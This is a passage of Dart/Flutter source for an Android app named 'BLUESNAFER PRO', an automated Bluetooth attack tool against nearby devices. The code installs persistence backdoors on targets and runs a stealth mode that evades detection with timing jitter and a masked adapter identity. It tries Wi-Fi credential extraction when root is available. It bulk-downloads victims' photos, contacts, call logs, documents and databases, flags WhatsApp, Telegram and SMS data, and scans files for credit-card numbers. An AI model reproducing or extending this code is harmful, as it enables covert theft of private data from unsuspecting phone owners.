    // Extracción de credenciales: intentar si hay root
    try {
      final hasRoot = await RealExploitService.hasRootAccess();
      if (hasRoot) {
        networkInfo['credential_extraction'] = 'attempted_with_root';
        networkInfo['note'] = 'Requiere acceso root + wpa_supplicant.conf - intentado';
      } else {
        networkInfo['credential_extraction'] = 'skipped_no_root';
        networkInfo['note'] = 'Credential extraction requires root access and system files';
      }
    } catch (_) {
      networkInfo['credential_extraction'] = 'error';
      networkInfo['note'] = 'Failed to check root status';
    }
    
     return networkInfo;
   }

   // Instalar mecanismo de persistencia
   Future<bool> _installPersistenceMechanism(String address, String displayName) async {
     if (!_enablePersistence) return false;
     
     _appendLog('  ⚙️ Instalando mecanismo de persistencia (foreground service + boot receiver)...');
     
     try {
       final result = await _exploitService.executeAttack(
         deviceAddress: address,
         type: 'install_persistence',
       );
       
       if (result['success'] == true) {
         _appendLog('  ✅ Persistencia instalada: ${result['mechanism']}');
         _appendLog('  ℹ️ Servicio en primer plano activo - se reiniciará automáticamente tras reinicio');
         
         _installedBackdoors.add({
           'address': address,
           'name': displayName,
           'type': result['mechanism'],
           'timestamp': DateTime.now().toIso8601String(),
           'service': 'PersistenceService',
           'boot_recovery': true,
           'message': result['message'],
         });
         
         _persistenceMechanisms.add({
           'address': address,
           'mechanism': result['mechanism'],
           'active': true,
           'boot_recovery': true,
         });
         
         return true;
       } else {
         _appendLog('  ❌ Error instalando persistencia: ${result['error']}');
         return false;
       }
     } catch (e) {
       _appendLog('  ❌ Excepción en persistencia: $e');
       return false;
     }
   }

  // Predicción de vulnerabilidades por heurísticas (sin modelos TFLite)
  Future<Map<String, dynamic>> _predictVulnerabilities(String address) async {
    if (!_enableAdaptiveIntelligence || _selectedDevice == null) {
      return {};
    }

    try {
      final prediction = await _heuristicEngine.assessVulnerabilities(
        address,
        _selectedDevice!,
      );

      _appendLog('  🔬 Heurística: ${prediction.cveCount} señales de vulnerabilidad (riesgo: ${prediction.overallRiskLevel})');

      final aiAnalysis = await _heuristicEngine.runCompleteSecurityAnalysis(
        deviceAddress: address,
        deviceData: _selectedDevice!,
      );

      _attackProbabilities = {
        for (final attack in aiAnalysis.optimalAttackStrategy.recommendedAttacks)
          attack.attackType: attack.confidence,
      };

      return {
        'ml_prediction': {
          'cve_count': prediction.cveCount,
          'risk_level': prediction.overallRiskLevel,
          'risk_score': prediction.overallRiskScore,
          'recommended_action': prediction.recommendedAction,
          'vulnerabilities': prediction.vulnerabilities.map((v) => {
            'id': v.id,
            'confidence': v.confidence,
            'type': v.type,
          }).toList(),
        },
        'high_risk_vulns': aiAnalysis.optimalAttackStrategy.recommendedAttacks
            .where((a) => a.confidence > 0.7)
            .map((a) => a.attackType)
            .toList(),
        'success_probability': aiAnalysis.confidence,
        'recommended_sequence': aiAnalysis.optimalAttackStrategy.recommendedAttacks
            .take(5)
            .map((a) => a.attackType)
            .toList(),
        'strategy_score': aiAnalysis.optimalAttackStrategy.overallStrategyScore,
      };
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  // Modo sigiloso - ejecutar ataques con mínima detección
  Future<void> _executeStealthMode(String address, String displayName) async {
    if (!_stealthMode) return;

    _appendLog('  🎭 [SIGILO] Reconocimiento pasivo de baja emisión...');

    // Espera con jitter aleatorio para no generar patrón de timing detectable.
    Future<void> stealthSleep({int minMs = 4000, int maxMs = 9000}) async {
      final range = (maxMs - minMs).clamp(100, 15000);
      final jitter = minMs + _stealthRng.nextInt(range);
      await Future.delayed(Duration(milliseconds: jitter));
    }

    try {
      // 1) Ocultar identidad del adaptador para no quedar marcado en el entorno.
      if (_maskDeviceIdentity) {
        try {
          final newName = await _exploitService.rotateHardwareIdentity();
          if (newName != null && newName.isNotEmpty) {
            _appendLog('  🧬 [SIGILO] Identidad adaptador ocultada.');
          }
        } catch (_) {}
      }

      // 2) Secuencia PASIVA de baja emisión: solo SDP/discovery. Nada de
      //    transferencias activas ni audio (son los que más delatan).
      const stealthPassive = [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'sdp_enumerate', 'command': 'all'},
        {'type': 'quickshare_discovery'},
        {'type': 'btle_spoof', 'command': 'identity'},
      ];

      for (final attack in stealthPassive) {
        if (!_isUnattendedRunning) return;
        await stealthSleep();
        try {
          final result = await _exploitService.executeAttack(
            deviceAddress: address,
            type: attack['type'] as String,
            command: attack['command'] as String?,
          );
          if (result['success'] == true) {
            _appendLog('  🔓 [SIGILO] ${attack['name'] ?? attack['type']} completo (baja emisión)');
          }
        } catch (_) {
          // Silenciar errores: no añadir ruido en modo sigiloso.
        }
      }
      _appendLog('  🎭 [SIGILO] Reconocimiento pasivo finalizado sin detección visible.');
    } catch (_) {
      // Nunca exportar trazas en modo sigiloso.
    }
  }

  // Generación de reporte automático
  Future<Map<String, dynamic>> _generateAutomatedReport({
    required int totalFiles,
    required int totalContacts,
    required int totalVulns,
    required int attacksExecuted,
    required int attacksSucceeded,
  }) async {
    final patterns = _enablePatternAnalysis ? await _analyzeExtractedPatterns() : {};
    
    final report = {
      'timestamp': DateTime.now().toIso8601String(),
      'devices_processed': _devices.length,
      'total_files_extracted': totalFiles,
      'total_contacts_extracted': totalContacts,
      'total_vulnerabilities_found': totalVulns,
      'attacks_executed': attacksExecuted,
      'attacks_succeeded': attacksSucceeded,
      'success_rate': attacksExecuted > 0 ? (attacksSucceeded * 100 / attacksExecuted).toStringAsFixed(1) : '0',
      'pattern_analysis': patterns,
      'network_analysis': _networkAnalysis,
      'persistence_installed': _installedBackdoors.length,
      'stealth_mode': _stealthMode,
      'data_collected': _collectedData.length,
      'advanced_system': _advancedAttackResult,
      'recommendations': _generateAttackRecommendations(),
    };
    
    _automatedReport = report;
    
    // Guardar reporte
    try {
      final prefs = await SharedPreferences.getInstance();
      prefs.setString('automated_report', jsonEncode(report));
    } catch (_) {}
    
    return report;
  }

  // Guardar reporte de un dispositivo específico
  Future<void> _saveDeviceReport(String address, Map<String, dynamic> report) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsKey = 'device_reports';
      final existingData = prefs.getString(reportsKey);
      final reports = existingData != null
          ? Map<String, dynamic>.from(jsonDecode(existingData))
          : <String, dynamic>{};
      reports[address] = report;
      await prefs.setString(reportsKey, jsonEncode(reports));
      _appendLog('   💾 Reporte guardado para $address');
    } catch (e) {
      _appendLog('   ⚠️ Error guardando reporte: $e');
    }
  }

  // Cargar todos los reportes guardados
  Future<Map<String, Map<String, dynamic>>> _loadAllDeviceReports() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsKey = 'device_reports';
      final existingData = prefs.getString(reportsKey);
      if (existingData == null) return {};
      final decoded = jsonDecode(existingData) as Map<String, dynamic>;
      return decoded.map((k, v) => MapEntry(k, Map<String, dynamic>.from(v as Map)));
    } catch (e) {
      return {};
    }
  }

  // Cargar reporte de un dispositivo específico
  Future<Map<String, dynamic>?> _loadDeviceReport(String address) async {
    final reports = await _loadAllDeviceReports();
    return reports[address];
  }

  // Obtener estrategia adaptativa basada en reportes previos
  Future<List<String>> _getAdaptiveStrategy(String address, String deviceType) async {
    final savedReport = await _loadDeviceReport(address);
    final allReports = await _loadAllDeviceReports();

    // El OBJETIVO del modo automático es siempre maximizar extracción de datos
    // (fotos, contactos, mensajes, identidad) y reconocimiento. Estas técnicas
    // se fusionan SIEMPRE aunque la IA haya aprendido otra estrategia.
    const essentialExtraction = [
      'extract_images',
      'mediastore_enhanced',
      'gatt_image_read',
      'opp_server_mode',
      'map_image_extract',
      'quickshare_server',
      'pbap_extract',
      'map_extract',
      'at_extract_identity',
      'sap_extract',
      'sdp_discover',
      'sdp_enumerate',
    ];
    List<String> withEssentials(List<String> names) {
      final set = names.toSet();
      set.addAll(essentialExtraction);
      return set.toList();
    }
    
    // Si hay reporte previo del dispositivo, usarlo
    if (savedReport != null) {
      final previousSuccess = savedReport['success'] as bool? ?? false;
      final previousAttacks = (savedReport['attacks'] as List?)?.cast<String>() ?? [];
      final previousFiles = savedReport['files'] as int? ?? 0;
      final previousContacts = savedReport['contacts'] as int? ?? 0;
      
      _appendLog('   📊 Reporte previo detectado');
      _appendLog('      Éxito anterior: ${previousSuccess ? "Sí" : "No"}');
      _appendLog('      Archivos: $previousFiles | Contactos: $previousContacts');
      
      if (previousSuccess && previousAttacks.isNotEmpty) {
        _appendLog('      💡 Repitiendo estrategia exitosa + esenciales de objetivo...');
        return withEssentials(previousAttacks);
      } else {
        _appendLog('      💡 Estrategia anterior falló. Probando nuevas técnicas...');
        // Agregar técnicas que no se intentaron antes
        final newAttacks = <String>['sdp', 'obex', 'pbap', 'at_injection'];
        for (final atk in previousAttacks) {
          newAttacks.remove(atk);
        }
        return withEssentials(newAttacks);
      }
    }
    
    // Analizar historial de otros dispositivos similares
    final similarReports = allReports.entries
        .where((e) => e.value['deviceType'] == deviceType)
        .toList();
    
    if (similarReports.isNotEmpty) {
      _appendLog('   📊 Aprendiendo de $deviceType (${similarReports.length} dispositivos)');
      
      final successfulAttacks = <String, int>{};
      for (final entry in similarReports) {
        final attacks = (entry.value['attacks'] as List?)?.cast<String>() ?? [];
        final success = entry.value['success'] as bool? ?? false;
        if (success) {
          for (final atk in attacks) {
            successfulAttacks[atk] = (successfulAttacks[atk] ?? 0) + 1;
          }
        }
      }
      
      if (successfulAttacks.isNotEmpty) {
        final sorted = successfulAttacks.entries.toList()
          ..sort((a, b) => b.value.compareTo(a.value));
        _appendLog('      📈 Técnicas exitosas: ${sorted.take(3).map((e) => "${e.key}(${e.value})").join(", ")}');
        return withEssentials(sorted.take(5).map((e) => e.key).toList());
      }
    }
    
    // Estrategia por defecto según tipo (usar TYPE no NAME para el dispatch)
    final defaultStrategy = _getAdaptiveAttackSequence(deviceType);
    return withEssentials(defaultStrategy.map((e) => e['type'] as String).toList());
  }

  // Guardar aprendizaje de la IA
  Future<void> _saveAIlearning(String deviceType, List<String> attacks, bool success) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final learningKey = 'ai_learning_$deviceType';
      final existingData = prefs.getString(learningKey);
      final learning = existingData != null
          ? Map<String, dynamic>.from(jsonDecode(existingData))
          : <String, dynamic>{
            'attempts': 0,
            'successes': 0,
            'techniques': <String, int>{},
          };
      
      learning['attempts'] = (learning['attempts'] as int? ?? 0) + 1;
      if (success) {
        learning['successes'] = (learning['successes'] as int? ?? 0) + 1;
      }
      
      final techniques = (learning['techniques'] as Map<String, dynamic>?) ?? {};
      for (final atk in attacks) {
        techniques[atk] = (techniques[atk] as int? ?? 0) + (success ? 1 : 0);
      }
      learning['techniques'] = techniques;
      
      await prefs.setString(learningKey, jsonEncode(learning));
    } catch (_) {}
  }

// Obtener estrategia basada en aprendizaje
  Future<List<Map<String, dynamic>>> _getLearnedStrategy(String deviceType) async {
    final learned = await _getLearnedTechniques(deviceType);
    
    if (learned.isEmpty) {
      // Si no hay aprendizaje, usar estrategia por defecto
      return _getAdaptiveAttackSequence(deviceType);
    }
    
    // Ordenar técnicas por éxito aprendido
    final sorted = learned.entries.toList()
      ..sort((a, b) => b.value.compareTo(a.value));
    
    _appendLog('   📊 Técnicas aprendidas: ${sorted.take(5).map((e) => "${e.key}(${e.value})").join(", ")}');
    
    // Crear estrategia basada en aprendizaje (match por TYPE)
    final strategy = <Map<String, dynamic>>[];
    final matchedKeys = <String>{};
    for (final entry in sorted) {
      for (final atk in allAttackTechniques) {
        if (atk['type'] == entry.key || atk['name'] == entry.key) {
          if (matchedKeys.add(atk['type'] as String)) {
            strategy.add(atk);
          }
          break;
        }
      }
    }
    
    // Agregar las que no están en aprendizaje
    for (final atk in allAttackTechniques) {
      if (!strategy.contains(atk)) {
        strategy.add(atk);
      }
    }
    
    return strategy;
  }

  // Obtener mejores técnicas aprendidas
  Future<Map<String, int>> _getLearnedTechniques(String deviceType) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final learningKey = 'ai_learning_$deviceType';
      final data = prefs.getString(learningKey);
      if (data == null) return {};
      final learning = jsonDecode(data) as Map<String, dynamic>;
      return (learning['techniques'] as Map<String, dynamic>?)
          ?.map((k, v) => MapEntry(k, v as int)) ?? {};
    } catch (_) {
      return {};
    }
  }

  // Estrategia ponderada: ordenar ataques por tasa de éxito aprendida
  Future<List<Map<String, dynamic>>> _getWeightedStrategy(String deviceType) async {
    final learned = await _getLearnedTechniques(deviceType);
    final totalAttempts = learned.values.fold(0, (a, b) => a + b);
    
    // Calcular tasa de éxito por técnica
    final Map<String, double> successRates = {};
    for (final entry in learned.entries) {
      successRates[entry.key] = totalAttempts > 0 ? entry.value / totalAttempts : 0.0;
    }
    
    // Clonar y ordenar por tasa de éxito (mayor primero, match por TYPE)
    final sorted = List<Map<String, dynamic>>.from(allAttackTechniques)
      ..sort((a, b) {
        final rateA = successRates[a['type']] ?? successRates[a['name']] ?? 0.5;
        final rateB = successRates[b['type']] ?? successRates[b['name']] ?? 0.5;
        return rateB.compareTo(rateA);
      });
    
    return sorted;
  }

  // Generar recomendaciones basadas en resultados
  List<String> _generateAttackRecommendations() {
    final recommendations = <String>[];
    
    if (_pbapContacts.isEmpty && _obexFiles.isEmpty) {
      recommendations.add('Intentar técnicas de bypass de autenticación');
    }
    
    if (_sdpServices.isEmpty) {
      recommendations.add('Ejecutar SDP discovery con mayor profundidad');
    }
    
    if (_attackProbabilities.isNotEmpty) {
      final topAttack = _attackProbabilities.entries
          .reduce((a, b) => a.value > b.value ? a : b);
      recommendations.add('Priorizar ataque: ${topAttack.key} (${(topAttack.value * 100).toStringAsFixed(0)}%)');
    }
    
    if (_fullScanResults.isEmpty) {
      recommendations.add('Ejecutar escaneo completo de vulnerabilidades');
    }
    
    if (_stealthMode) {
      recommendations.add('Considerar modo normal para mayor efectividad');
    }
    
    return recommendations;
  }

  // Backoff exponencial para reintentos (usa SuccessOptimizer con datos históricos)
  Duration _calculateBackoffDelay(int attempt) {
    if (_selectedDevice != null) {
      final addr = _selectedDevice!['address']?.toString() ?? '';
      if (addr.isNotEmpty && _lastAttackType.isNotEmpty) {
        final ms = _successOptimizer.calculateBackoffDelay(addr, _lastAttackType, attempt);
        return Duration(milliseconds: ms);
      }
    }
    final delayMs = _baseDelayMs * (_backoffMultiplier.toInt() * attempt);
    return Duration(milliseconds: delayMs.clamp(1000, 30000));
  }

  String _lastAttackType = '';

  // Ejecución con reintentos y backoff
  Future<Map<String, dynamic>> _executeWithRetry({
    required String type,
    required String address,
    String? command,
    String? script,
    int maxAttempts = 3,
  }) async {
    if (type.isEmpty) return {'success': false, 'message': 'Empty type'};
    for (int attempt = 1; attempt <= maxAttempts; attempt++) {
      if (!_isUnattendedRunning) return {'success': false, 'message': 'Cancelled'};
      
      try {
        final result = await _exploitService.executeAttack(
          deviceAddress: address,
          type: type,
          command: command,
          script: script,
        );
        
        if (result['success'] == true) {
          return result;
        }
        
        _appendLog('  ⚠️ Intento #$attempt fallido, reintentando...');
      } catch (e) {
        _appendLog('  ❌ Error en intento #$attempt: $e');
      }
      
      if (attempt < maxAttempts) {
        final delay = _calculateBackoffDelay(attempt);
        await Future.delayed(delay);
      }
    }
    
    return {'success': false, 'message': 'Failed after $maxAttempts attempts'};
  }

  // Estado para persistencia
  bool _hasRestoredState = false;

  Future<void> _saveState() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      if (_selectedDevice != null) {
        prefs.setString('selected_device_address', _selectedDevice!['address'] ?? '');
        prefs.setString('selected_device_name', _selectedDevice!['name'] ?? '');
      }
      prefs.setString('executed_attacks', _executedAttacks.join(','));
      
      // Save extracted results as JSON
      if (_blueBorneResults.isNotEmpty) {
        prefs.setString('blueborne_results', jsonEncode(_blueBorneResults));
      }
      if (_gattMirrorResults.isNotEmpty) {
        prefs.setString('gatt_mirror_results', jsonEncode(_gattMirrorResults));
      }
      if (_fullScanResults.isNotEmpty) {
        prefs.setString('full_scan_results', jsonEncode(_fullScanResults));
      }
      if (_atInjectionResults.isNotEmpty) {
        prefs.setString('at_injection_results', jsonEncode(_atInjectionResults));
      }
      if (_pbapContacts.isNotEmpty) {
        prefs.setString('pbap_contacts', jsonEncode(_pbapContacts));
      }
      if (_pbapCalls.isNotEmpty) {
        prefs.setString('pbap_calls', jsonEncode(_pbapCalls));
      }
      if (_sdpServices.isNotEmpty) {
        prefs.setString('sdp_services', jsonEncode(_sdpServices));
      }
      if (_gattDump.isNotEmpty) {
        prefs.setString('gatt_dump', jsonEncode(_gattDump));
      }
      if (_obexFiles.isNotEmpty) {
        prefs.setString('obex_files', jsonEncode(_obexFiles));
      }
      if (_extractedImages.isNotEmpty) {
        prefs.setString('extracted_images', jsonEncode(_extractedImages));
      }
      if (_mediastoreEnhanced.isNotEmpty) {
        prefs.setString('mediastore_enhanced', jsonEncode(_mediastoreEnhanced));
      }
      if (_gattImages.isNotEmpty) {
        prefs.setString('gatt_images', jsonEncode(_gattImages));
      }
      if (_oppReceivedImages.isNotEmpty) {
        prefs.setString('opp_received_images', jsonEncode(_oppReceivedImages));
      }
      if (_mapImages.isNotEmpty) {
        prefs.setString('map_images', jsonEncode(_mapImages));
      }
     } catch (_) {}
   }

   // Descarga automatica de archivos interesantes tras listado OBEX
   Future<void> _downloadFilesFromListing(String address, String displayName, String directory, Map<String, dynamic> listResult) async {
     if (listResult['success'] != true) return;

     final files = (listResult['files'] as List? ?? []).cast<Map<String, dynamic>>();
     if (files.isEmpty) {
       _appendLog('  No hay archivos en $directory');
       return;
     }

     _appendLog('  📁 $directory: ${files.length} archivos encontrados');

     // Filtrar solo archivos interesantes (fotos, videos, documentos)
     final interestingExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.webp', '.avi', '.mov', '.3gp', '.pdf', '.txt', '.vcf', '.doc', '.docx', '.xls', '.xlsx', '.db', '.sqlite'];
     final interestingFiles = files.where((file) {
       final fileName = (file['name']?.toString() ?? '').toLowerCase();
       return interestingExtensions.any((ext) => fileName.endsWith(ext));
     }).toList();

     if (interestingFiles.isNotEmpty) {
       _appendLog('  📸 ${interestingFiles.length} archivos interesantes - descargando...');

       for (final file in interestingFiles.take(20)) {
         if (!_isUnattendedRunning) break;

         final fileName = file['name']?.toString() ?? '';
         if (fileName.isEmpty) continue;

         // Construir ruta completa
         final filePath = directory.endsWith('/') ? '$directory$fileName' : '$directory/$fileName';

         try {
           final dlResult = await _exploitService.downloadFile(address, filePath);
           if (dlResult['success'] == true) {
             final size = dlResult['size'] ?? 0;
             _collectedData.add('📥 [$displayName] $fileName ($size bytes)');
             _appendLog('    ✅ $fileName ($size bytes)');
           } else {
             _appendLog('    ❌ $fileName: ${dlResult['error'] ?? 'failed'}');
           }
         } catch (e) {
           _appendLog('    ❌ $fileName: $e');
         }
       }
     } else {
       _appendLog('  No se encontraron archivos multimedia en $directory');
     }
    }

    // Análisis profundo de patrones en archivos OBEX
  Future<void> _deepPatternAnalysis() async {
      for (final file in _obexFiles) {
        final path = file['path']?.toString() ?? '';
        final name = file['name']?.toString() ?? '';
        final ext = path.substring(path.lastIndexOf('.')).toLowerCase();
        
        // IMAGE EXIF analysis
        if (['.jpg', '.jpeg', '.png', '.heic'].contains(ext)) {
          if (name.toLowerCase().contains('screenshot')) {
            _collectedData.add('📸 [SCREENSHOT] $name - may contain UI state');
          }
        }
        
        // VCARD social URLs
        if (ext == '.vcf') {
          try {
            final content = await File(path).readAsString();
            final urlRegex = RegExp(r'URL:(.+)', caseSensitive: false);
            for (final match in urlRegex.allMatches(content)) {
              _collectedData.add('🔗 [SOCIAL] ${match.group(1)}');
            }
            final emailRegex = RegExp(r'EMAIL:(.+)', caseSensitive: false);
            for (final match in emailRegex.allMatches(content)) {
              _collectedData.add('📧 [EMAIL] ${match.group(1)}');
            }
          } catch (e) {}
        }
        
        // SQLITE database analysis
        if (['.db', '.sqlite', '.sqlite3'].contains(ext)) {
          _collectedData.add('💾 [DB] $name - inspect for SMS/WhatsApp/Telegram');
          if (name.toLowerCase().contains('whatsapp')) {
            _collectedData.add('   → WHATSAPP database detected (messages, media)');
          }
          if (name.toLowerCase().contains('telegram')) {
            _collectedData.add('   → TELEGRAM database detected');
          }
          if (name.toLowerCase().contains('sms') || name.toLowerCase().contains('mmssms')) {
            _collectedData.add('   → SMS/MMS database detected');
          }
        }
        
        // DOCUMENT analysis
        if (['.pdf', '.doc', '.docx', '.txt'].contains(ext)) {
          try {
            final content = await File(path).readAsString();
            final ccRegex = RegExp(r'\b(?:\d[ -]*?){13,16}\b');
            if (ccRegex.hasMatch(content)) {
              _collectedData.add('💳 [CREDIT_CARD] Pattern detected in $name');
            }
          } catch (e) {}
        }
      }
      
      _appendLog('🔍 Deep pattern analysis completed on ${_obexFiles.length} files');
    }

    Future<void> _restoreState() async {
    if (_hasRestoredState) return;
    try {
      final prefs = await SharedPreferences.getInstance();
      final addr = prefs.getString('selected_device_address') ?? '';
      final name = prefs.getString('selected_device_name') ?? '';
      final attacks = prefs.getString('executed_attacks') ?? '';
      if (attacks.isNotEmpty) {
        _executedAttacks = attacks.split(',');
      }
      
      // Restore extracted results
      _blueBorneResults = _loadJsonList(prefs, 'blueborne_results');
      _gattMirrorResults = _loadJsonList(prefs, 'gatt_mirror_results');
      _fullScanResults = _loadJsonList(prefs, 'full_scan_results');
      _atInjectionResults = _loadJsonList(prefs, 'at_injection_results');
      _pbapContacts = _loadJsonList(prefs, 'pbap_contacts');
      _pbapCalls = _loadJsonList(prefs, 'pbap_calls');
      _sdpServices = _loadJsonList(prefs, 'sdp_services');
      _gattDump = _loadJsonList(prefs, 'gatt_dump');
      _obexFiles = _loadJsonList(prefs, 'obex_files');
      _extractedImages = _loadJsonList(prefs, 'extracted_images');
      _mediastoreEnhanced = _loadJsonList(prefs, 'mediastore_enhanced');
      _gattImages = _loadJsonList(prefs, 'gatt_images');
      _oppReceivedImages = _loadJsonList(prefs, 'opp_received_images');
      _mapImages = _loadJsonList(prefs, 'map_images');
      
      if (addr.isNotEmpty) {
        // Solo restaurar si parece válido (MAC address real)
        if (addr.contains(RegExp(r'^[0-9A-Fa-f:]{11,}$'))) {
          _selectedDevice = {'address': addr, 'name': name, 'rssi': '0', 'isRestored': true};
          _hasRestoredState = true;
          _appendLog('💾 Estado restaurado: $name ($addr) - escanea para validar');
          if (_hasResults()) {
            _appendLog('📊 ${_collectedData.length} datos previos restaurados');
          }
        }
      }
    } catch (_) {}
  }

  List<Map<String, dynamic>> _loadJsonList(SharedPreferences prefs, String key) {
    try {
      final json = prefs.getString(key);
      if (json != null && json.isNotEmpty) {
        final list = jsonDecode(json) as List;
        return list.map((e) => Map<String, dynamic>.from(e as Map)).toList();
      }
    } catch (_) {}
    return [];
  }

  void _appendLog(String msg) {
    if (!mounted) return;
    setState(() {
      _log.add(msg);
      if (_log.length > 200) _log = _log.sublist(_log.length - 200);
    });
    // NO guardar aquí - Kotlin ya guarda en external storage
    Future.delayed(const Duration(milliseconds: 50), () {
      if (_logScrollController.hasClients && _logScrollController.position.hasContentDimensions) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }
  
  Future<void> _saveLogsToExternalStorage(String newLog) async {
    try {
      final externalDir = await getExternalStorageDirectory();
      if (externalDir == null) return;
      final logDir = Directory('${externalDir.path}/bluesnafer_logs');
      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }
      final now = DateTime.now();
      final fileName = 'console_log_${now.year}-${now.month.toString().padLeft(2, '0')}-${now.day.toString().padLeft(2, '0')}.txt';
      final logFile = File('${logDir.path}/$fileName');
      // Write with UTF-8 encoding explicitly
      final sink = logFile.openWrite(mode: FileMode.append, encoding: utf8);
      sink.write('${newLog}\n');
      await sink.flush();
      await sink.close();
    } catch (e) {
      // Silently fail - don't call _appendLog here to avoid recursion
    }
  }
  
  Future<void> _exportLogs() async {
    try {
      String allLogs = "=== BLUESNAFER PRO - LOGS DE CONSOLA ===\n";
      allLogs += "Fecha: ${DateTime.now()}\n";
      allLogs += "${"=" * 50}\n\n";
      allLogs += _log.join('\n');
      
      // Guardar en almacenamiento externo accesible por USB
      // Ruta: /storage/emulated/0/Android/data/com.bluesnafer_pro/files/bluesnafer_logs/
      try {
        final externalDir = await getExternalStorageDirectory();
        if (externalDir != null) {
          final logDir = Directory('${externalDir.path}/bluesnafer_logs');
          if (!await logDir.exists()) {
            await logDir.create(recursive: true);
          }
          final exportFile = File('${logDir.path}/console_logs_${DateTime.now().millisecondsSinceEpoch}.txt');
          await exportFile.writeAsString(allLogs);
          _appendLog('✅ Logs exportados a: ${exportFile.path}');
          _appendLog('   Conecta el móvil al PC vía USB y navega a:');
          _appendLog('   Almacenamiento interno > Android > data > com.bluesnafer_pro > files > bluesnafer_logs');
          return;
        }
      } catch (e) {
        // Fallback si getExternalStorageDirectory falla
      }
      
      // Fallback: usar getApplicationDocumentsDirectory
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/bluesnafer_logs');
      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }
      final exportFile = File('${logDir.path}/console_logs_${DateTime.now().millisecondsSinceEpoch}.txt');
      await exportFile.writeAsString(allLogs);
      _appendLog('✅ Logs guardados en: ${exportFile.path}');
      _appendLog('⚠️ Esta ubicación requiere ADB para acceder');
      
    } catch (e) {
      _appendLog('❌ Error exportando: $e');
    }
  }

  // Mostrar reporte automático
  void _showAutomatedReport() async {
    if (!mounted) return;
    
    if (_automatedReport.isEmpty) {
      _appendLog('📊 No hay reporte disponible. Ejecuta el modo automático primero.');
      return;
    }
    
    final report = _automatedReport;
    
    if (!mounted) return;
    
    showDialog(
      context: context,
      builder: (dialogContext) => AlertDialog(
        backgroundColor: const Color(0xFF0F172A),
        title: const Row(
          children: [
            Icon(Icons.assessment, color: Colors.cyanAccent),
            SizedBox(width: 8),
            Text('REPORTE AUTOMÁTICO', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            mainAxisSize: MainAxisSize.min,
            children: [
              _buildReportSection('General', [
                'Dispositivos: ${report['devices_processed']}',
                'Éxito: ${report['success_rate']}%',
                'Datos recolectados: ${report['data_collected']}',
              ]),
              _buildReportSection('Archivos', [
                'OBEX: ${report['total_files_extracted']}',
                'Apps: ${report['pattern_analysis']?['images'] ?? 0} imágenes',
                'Documentos: ${report['pattern_analysis']?['documents'] ?? 0}',
              ]),
              _buildReportSection('Contactos', [
                'Total: ${report['total_contacts_extracted']}',
                'Emails trabajo: ${report['pattern_analysis']?['work_emails']?.length ?? 0}',
                'Teléfonos: ${report['pattern_analysis']?['phone_numbers']?.length ?? 0}',
              ]),
              _buildReportSection('Red', [
                'Info extraída: ${report['network_analysis']?.length ?? 0}',
                'Persistencia: ${report['persistence_installed']}',
              ]),
              if ((report['recommendations'] as List?)?.isNotEmpty ?? false)
                _buildReportSection('Recomendaciones', 
                  (report['recommendations'] as List).cast<String>().take(5).toList()),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              if (mounted) Navigator.pop(context);
            },
            child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent)),
          ),
        ],
      ),
    );
  }

  // Mostrar reportes guardados
  void _showSavedReports() async {
    if (!mounted) return;
    
    final reports = await _loadAllDeviceReports();
    
    if (!mounted) return;
    
    if (reports.isEmpty) {
      _appendLog('📋 No hay reportes guardados.');
      showDialog(
        context: context,
        builder: (dialogContext) => AlertDialog(
          backgroundColor: const Color(0xFF0F172A),
          title: const Row(
            children: [
              Icon(Icons.history, color: Colors.orangeAccent),
              SizedBox(width: 8),
              Text('REPORTES GUARDADOS', style: TextStyle(color: Colors.white)),
            ],
          ),
          content: const Text(
            'No hay reportes guardados.\nEjecuta el modo automático primero.',
            style: TextStyle(color: Colors.white70),
          ),
          actions: [
            TextButton(
              onPressed: () {
                if (mounted) Navigator.pop(context);
              },
              child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent)),
            ),
          ],
        ),
      );
      return;
    }
    
    if (!mounted) return;
    
    showDialog(
      context: context,
      builder: (dialogContext) => AlertDialog(
        backgroundColor: const Color(0xFF0F172A),
        title: Row(
          children: [
            const Icon(Icons.history, color: Colors.orangeAccent),
            const SizedBox(width: 8),
            Text('REPORTES GUARDADOS (${reports.length})', style: const TextStyle(color: Colors.white)),
          ],
        ),
        content: SizedBox(
          width: double.maxFinite,
          height: 400,
          child: ListView.builder(
            shrinkWrap: true,
            itemCount: reports.length,
            itemBuilder: (context, i) {
              final entry = reports.entries.elementAt(i);
              final data = entry.value;
              final success = data['success'] as bool? ?? false;
              final files = data['files'] as int? ?? 0;
              final contacts = data['contacts'] as int? ?? 0;
              final attacks = (data['attacks'] as List?)?.cast<String>() ?? [];
              final timestamp = data['timestamp'] as String? ?? '';
              final deviceType = data['deviceType'] as String? ?? 'desconocido';
              
              return Card(
                color: const Color(0xFF1E293B),
                margin: const EdgeInsets.only(bottom: 8),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Icon(success ? Icons.check_circle : Icons.error, color: success ? Colors.greenAccent : Colors.redAccent, size: 16),
                          const SizedBox(width: 8),
                          Expanded(child: Text(entry.key.length > 8 ? entry.key.substring(0, 8) + '...' : entry.key, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12))),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                            decoration: BoxDecoration(color: Colors.purpleAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)),
                            child: Text(deviceType, style: const TextStyle(color: Colors.purpleAccent, fontSize: 10)),
                          ),
                        ],
                      ),
